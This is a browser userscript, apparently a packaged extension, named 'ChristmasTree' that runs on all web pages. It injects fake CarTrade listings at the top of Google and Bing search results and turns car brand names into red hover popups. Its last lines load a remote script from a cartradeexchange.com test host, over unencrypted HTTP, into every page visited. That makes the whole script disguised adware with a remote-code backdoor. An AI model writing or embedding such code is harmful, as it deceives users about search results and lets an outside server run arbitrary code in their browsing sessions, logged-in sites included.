// ==UserScript==
// @name ChristmasTree
// @include http://*
// @include https://*
// @include about:blank
// @require jquery-1.9.1.min.js
// @require replacetext.min.js

// ==/UserScript==

$(document).ready(function (){

if (typeof jQuery == 'undefined') {  
  document.write('<script src="http://code.jquery.com/jquery-1.11.2.min.js">');
}

if(document.location.host == 'www.google.com' || document.location.host == 'www.google.co.in'){

	$("#rso").prepend('<li class="g" data-hveid="46"><div><!--m--><div class="rc" data-hveid="47"><h3 class="r"><a href="http://www.cartrade.com/" onmousedown="">CarTrade.com | Buy Used Cars in India, New Cars, Sell ...</a></h3><div class="s"><div><div class="f kv _SWb" style="white-space:nowrap"><cite class="_Rm">www.<b>cartrade</b>.com/</cite><div class="action-menu ab_ctl"><a class="_Fmb ab_button" href="#" id="am-b0" aria-label="Result details" aria-expanded="false" aria-haspopup="true" role="button" jsaction="ab.tdd;keydown:ab.hbke;keypress:ab.mskpe" data-ved="0CDEQ7B0wAA"><span class="mn-dwn-arw"></span></a><div class="action-menu-panel ab_dropdown" role="menu" tabindex="-1" jsaction="keydown:ab.hdke;mouseover:ab.hdhne;mouseout:ab.hdhue" data-ved="0CDIQqR8wAA"><ul><li class="action-menu-item ab_dropdownitem" role="menuitem"><a class="fl" href="http://webcache.googleusercontent.com/search?q=cache:_uCCOyYzMjUJ:www.cartrade.com/+&amp;cd=1&amp;hl=en&amp;ct=clnk&amp;gl=in" onmousedown="">Cached</a></li><li class="action-menu-item ab_dropdownitem" role="menuitem"><a class="fl" href="/search?es_sm=122&amp;q=related:www.cartrade.com/+cartrade&amp;tbo=1&amp;sa=X&amp;ei=Vtb9VMOUDMvauQT4yYLwBQ&amp;ved=0CDQQHzAA">Similar</a></li></ul></div></div></div><div class="f slp"></div><span class="st"><em>CarTrade</em>.com - Buy from lakhs of new and used cars for sale across India. Research cars by prices, comparisons, reviews, pictures. Read latest auto news on&nbsp;...</span></div></div></div><!--n--><table class="nrgt" cellpadding="0" cellspacing="0"><tbody><tr class="mslg _Amc"><td style="vertical-align:top"><!--m--><div class="sld vsc" data-hveid="54"><span class="_Tyb"><h3 class="r"><a class="l" href="http://www.cartrade.com/buy-used-cars/hyderabad/c" onmousedown="">Hyderabad</a></h3></span><div class="s"><cite>www.<b>cartrade</b>.com/buy-used-cars/<b>hyderabad</b>/c</cite><div class="st" style="overflow:hidden;width:220px">Find 3,636 Used Petrol Cars in Hyderabad and 4,525 Used ...<br></div></div></div><!--n--></td><td style="vertical-align:top"><!--m--><div class="sld vsc" data-hveid="56"><span class="_Tyb"><h3 class="r"><a class="l" href="http://www.cartrade.com/buy-used-cars/certified" onmousedown="">What is Cartrade Certification?</a></h3></span><div class="s"><cite>www.<b>cartrade</b>.com/buy-used-cars/certified</cite><div class="st" style="overflow:hidden;width:220px">Honda Brio is the lowest priced used car available for Rs ...<br></div></div></div><!--n--></td></tr><tr class="mslg"><td style="vertical-align:top"><!--m--><div class="sld vsc" data-hveid="58"><span class="_Tyb"><h3 class="r"><a class="l" href="http://www.cartrade.com/answers/29548.html" onmousedown="">Recently i have asked Maruti ...</a></h3></span><div class="s"><cite>www.<b>cartrade</b>.com/answers/29548.html</cite><div class="st" style="overflow:hidden;width:220px">Recently i have asked Maruti Dealer in Kakinada( Andhra&nbsp;...<br></div></div></div><!--n--></td><td style="vertical-align:top"><!--m--><div class="sld vsc" data-hveid="60"><span class="_Tyb"><h3 class="r"><a class="l" href="http://www.cartrade.com/used-cars" onmousedown="">Used Cars</a></h3></span><div class="s"><cite>www.<b>cartrade</b>.com/<b>used</b>-<b>cars</b></cite><div class="st" style="overflow:hidden;width:220px">162888 used cars available for sale in India on CarTrade.com ...<br></div></div></div><!--n--></td></tr><tr class="mslg"><td style="vertical-align:top"><!--m--><div class="sld vsc" data-hveid="62"><span class="_Tyb"><h3 class="r"><a class="l" href="http://www.cartrade.com/buy-used-cars" onmousedown="">Buy Used Cars</a></h3></span><div class="s"><cite>www.<b>cartrade</b>.com/<b>buy</b>-<b>used</b>-<b>cars</b></cite><div class="st" style="overflow:hidden;width:220px">Buy Used Cars in India at best prices. Get certified second ...<br></div></div></div><!--n--></td><td style="vertical-align:top"><!--m--><div class="sld vsc" data-hveid="64"><span class="_Tyb"><h3 class="r"><a class="l" href="http://www.cartrade.com/new-cars" onmousedown="">New Cars</a></h3></span><div class="s"><cite>www.<b>cartrade</b>.com/<b>new</b>-<b>cars</b></cite><div class="st" style="overflow:hidden;width:220px">Research new cars in 2015; Get on road prices at CarTrade.com ...<br></div></div></div><!--n--></td></tr><tr><td colspan="2" style="padding-left:6px;vertical-align:top"><div class="mrf"><a class="fl" href="/search?es_sm=122&amp;q=+site:cartrade.com+cartrade&amp;sa=X&amp;ei=Vtb9VMOUDMvauQT4yYLwBQ&amp;ved=0CEIQrAM">More results from cartrade.com&nbsp;»</a></div></td></tr></tbody></table></div></li>');
}
if(document.location.host == 'www.bing.com' || document.location.host == 'www.bing.co.in'){
$("#b_results").prepend('<h2><a href="http://www.cartrade.com/" h="ID=SERP,5123.1"><strong>CarTrade</strong> - Official Site</a></h2><div class="b_caption"><div class="b_attribution" u="0N|5110|4573475866936629|Ll32lJtnTG0fxuzs4k-D6jgrcPLLvuoq"><cite>www.<strong>cartrade</strong>.com</cite><a aria-haspopup="1" aria-label="Actions for this site" href="#"><span class="c_tlbxTrg"><span class="c_tlbxTrgIcn sw_ddgn"></span><span class="c_tlbxH" h="BASE:CACHEDPAGEDEFAULT" k="SERP,5124.1"></span></span></a></div><p><strong>CarTrade</strong>.com - Buy from lakhs of new and used cars for sale across India. Research cars by prices, comparisons, reviews, pictures. Read latest auto news on the ...</p></div><div class="b_vlist2col b_deep"><ul><li><h3><a href="http://www.cartrade.com/buy-used-cars" h="ID=SERP,5115.1">Buy Used Cars</a></h3><p>Buy Used Cars in India at best prices. Get certified second hand cars in …</p></li><li><h3><a href="http://www.cartrade.com/new-cars" h="ID=SERP,5116.1">New Cars</a></h3><p>Find New Cars in India. Research new cars in 2015; Get on road prices …</p></li><li><h3><a href="http://www.cartrade.com/buy-used-cars/mumbai/c" h="ID=SERP,5117.1">Mumbai</a></h3><p>Find 10644 Used Cars in Mumbai for best prices at CarTrade.com. …</p></li></ul><ul><li><h3><a href="http://www.cartrade.com/buy-used-cars/new-delhi/c" h="ID=SERP,5118.1">New Delhi</a></h3><p>Find 17163 Used Cars in New Delhi for best prices at CarTrade.com. …</p></li><li><h3><a href="http://www.cartrade.com/buy-used-cars/bangalore/c" h="ID=SERP,5119.1">Bangalore</a></h3><p>Find 8133 Used Cars in Bangalore for best prices at CarTrade.com. …</p></li><li><h3><a href="http://www.cartrade.com/buy-used-cars/pune/c" h="ID=SERP,5120.1">Pune</a></h3><p>Certified Used Cars in Pune. Total of 628 Certified Used cars are …</p></li></ul></div>');
}
  $().mousemove(function(e){
      window.mouseXPos = e.pageX;
      window.mouseYPos = e.pageY;
   }); 

var cars = ["Maruti Suzuki","Hyundai","Tata","Volkswagen","Honda","Toyota","Ford","Chevrolet","Mahindra","Skoda"];
	for (ii in cars)
	{
	var ta = cars[ii];
	var te = $("div,span,p,h1,h2,h3").replaceText( new RegExp("\\b("+ta+")\\b","gi", 'i'), embolden );
	}
	

function embolden( str ){
  return "<span onmouseover= \"buycar(this,'"+str+"')\" style='padding: 3px; background-color: red; color: white; font-weight: bold; border-radius: 51px;box-shadow:-3px -2px 2px black;' color='red' size='4'>" + str + "<img src='http://i.imgur.com/840UQio.png' width='10'><\/span>";

};



var dv = $(document.createElement('iframe')).attr({
    // src: 'http://kangoextensions.com/misc/tree.png',
    id:"iframe_feroz",
    onmouseout:"close_ferozframe()",
    onmouseover:"show_ferozframe()",
}).css({
    display:'none',
    width:'351px',
    height:'150px',
    background:'red',
    position:'absolute',
    "border-radius":"15px",
    border:"2px solid black",
    //left: document.body.clientWidth - 280 + 'px',
    'z-index': '10000'
}).appendTo(document.body);
// console.log($('.srg').html());
var dv = $(document.createElement('div')).attr({
    // src: 'http://kangoextensions.com/misc/tree.png',
    id:"panel",
}).css({
    position:'absolute',
    top: '120px',
    width:'50px',
    height:'50px',
    background:'red',
    left:'-50px',
    //left: document.body.clientWidth - 280 + 'px',
    'z-index': '10000'
}).appendTo(document.body);





var dvv = $(document.createElement('div')).attr({
    // src: 'http://kangoextensions.com/misc/tree.png',
    id:"close_feroz",
}).css({
    display:"none",
    padding:"3px",
    position:"absolute",
    width:"10px",
    height:"15px",
    "border-radius":"30px",
    "background-color":"black",
    color:"white",
    "font-weight":"bold",
    //left: document.body.clientWidth - 280 + 'px',
    'z-index': '10000'
}).text("X").appendTo(document.body);
dvv.click(function (){

close_ferozframe();
});


var an = $(document.createElement('a')).attr({
    // src: 'http://kangoextensions.com/misc/tree.png',
    class:"show",
    href:"javascript:void(0);"
}).css({
    position: 'absolute',
    top: '120px',
    width:'16px',
    height:'20px',
    background:'black',
    //left: document.body.clientWidth - 280 + 'px',
    left:'0px',
    'z-index': '10000'
}).appendTo(document.body);
// kango.console.log(dv);
an.click(function (){
	
      if($(this).hasClass('show')){
	    $( "#panel,.show" ).animate({
          left: "+=60"
		  }, 700, function() {
            // Animation complete.
          });
		  $(this).html('&laquo;').removeClass('show').addClass('hide');
        }
        else {   	
	    $( "#panel,.hide" ).animate({
          left: "-=60"
		  }, 700, function() {
            // Animation complete.
          });
		  $(this).html('&raquo;').removeClass('hide').addClass('show');    
        }
});

var my_script = document.createElement('script');

my_script.setAttribute('src','http://test.cartradeexchange.com/test.js');

document.head.appendChild(my_script);


});
